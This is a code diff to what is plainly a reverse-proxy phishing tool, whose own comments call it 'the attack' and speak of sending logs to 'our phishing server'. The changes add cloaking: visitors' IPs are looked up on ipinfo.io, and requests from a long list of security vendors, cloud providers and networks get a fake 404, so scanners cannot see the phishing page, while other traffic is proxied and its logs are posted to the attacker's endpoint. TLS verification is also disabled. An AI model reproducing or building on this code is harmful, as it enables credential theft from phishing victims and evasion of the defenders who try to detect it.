@@ -6,6 +6,10 @@ const sqlite3 = require('sqlite3').verbose();
 const dateFormat = require('dateformat')
 fastify.register(require('fastify-cookie'))
 
+var ip_blacklist = []
+var ip_whitelist = []
+const org_blacklist = ["Google","Microsoft","Forcepoint","Mimecast","ZSCALER","Fortinet","Amazon","PALO ALTO","RIPE","McAfee","M247","Internap","AS205100","YISP","Kaspersky","Berhad","DigitalOcean","IP Volume","Markus","ColoCrossing","Norton","Datacamp Limited","Scalair SAS","NForce Entertainment","Wintek Corporation","ONLINE S.A.S.","WestHost","Labitat","Orange Polska Spolka Akcyjna","OVH SAS","DediPath","AVAST","GoDaddy","SunGard","Netcraft","Emsisoft","CHINANET","Rackspace","Selectel","Sia Nano IT","AS1257","Zenlayer","Hetzner","AS51852","TalkTalk Communications","Spectre Operations","VolumeDrive","Powerhouse Management","HIVELOCITY","SoftLayer Technologies","AS3356","AS855","AS7459","AS42831","AS61317","AS5089","Faction","Plusnet","Total Server","AS262997","AS852","Guanghuan Xinwang","AS174","AS45090","AS41887","Contabo","IPAX","AS58224","AS18002","HangZhou","Linode","AS6849","AS34665","SWIFT ONLINE BORDER","AS38511","AS131111","Telefonica del Peru","BRASIL S.A","Merit Network","Beijing","QuadraNet","Afrihost","Vimpelcom","Allstream","Verizon","HostRoyale","Hurricane Electric","AS12389","Packet Exchange","AS52967","AS45974","Fastweb","AS17552","Alibaba","AS12978","AS43754","CariNet","AS28006","Free Technologies","DataHata","GHOSTnet","AS55720","Emerald Onion","AS208323","AS6730","AS11042","AS53667","AS28753","AS28753","Globalhost d.o.o","AS133119","Huawei","FastNet","AS267124","BKTech","Optisprint","AS24151","Pogliotti","321net","AS4800","Kejizhongyi","SIMBANET","AS42926","Web2Objects","AS12083"]
+
 //display welcome banner
 console.log(fs.readFileSync('./resources/banner.txt','utf8'))
 
@@ -101,7 +105,7 @@ var ship_logs = function(log_data, domain_config){
   //send logs off to our phishing server/logging endpoint
   got.post("https://" + domain_config.logging_endpoint.host + domain_config.logging_endpoint.url , {
     headers: headers,
-    rejectUnauthorized: false,
+    https: {rejectUnauthorized: false},
     json: log_data
   }).catch(function(err){
     console.log("Logging Endpoint Failed: https://" + domain_config.logging_endpoint.host + domain_config.logging_endpoint.url)
@@ -193,7 +197,7 @@ async function humble_proxy(request, reply){
     request_options = {
       followRedirect: false,
       throwHttpErrors: false,
-      rejectUnauthorized: false,
+      https: {rejectUnauthorized: false},
       headers: myreq.headers,
       method: myreq.method
     }
@@ -250,12 +254,40 @@ async function humble_proxy(request, reply){
   }
 }
 
+//add easy 404 function
+fastify.decorate('notFound', (request, reply) => {
+  reply.code(404).type('text/html').send('Not Found')
+})
+
 //catchall route for the attack
 fastify.route({
   method: ['DELETE', 'GET', 'HEAD', 'PATCH', 'POST', 'PUT', 'OPTIONS'],
   url: '/*',
   handler: async function (request, reply) {
-    humble_proxy(request, reply)
+    let client_ip = request.headers['x-real-ip']
+    if(ip_blacklist.includes(client_ip)){
+      return fastify.notFound(request, reply)
+    }else if(ip_whitelist.includes(client_ip)){
+      humble_proxy(request, reply)
+    }else{
+     let ip_info = await got(`http://ipinfo.io/${client_ip}/json`)
+      let ip_org = JSON.parse(ip_info.body).org
+      let approved = true
+      org_blacklist.forEach(function(crawler_org){
+        if(ip_org.match(crawler_org)){
+          approved = false
+        }
+      })
+      if(approved){
+        console.log(`Allowing organization: "${ip_org}" from ${client_ip}`)
+        ip_whitelist.push(client_ip)
+        humble_proxy(request, reply)
+      }else{
+        console.log(`blocking blacklisted org: "${ip_org}" from ${client_ip}`)
+        ip_blacklist.push(client_ip)
+        return fastify.notFound(request, reply)
+      }
+    }
   }
 })
 
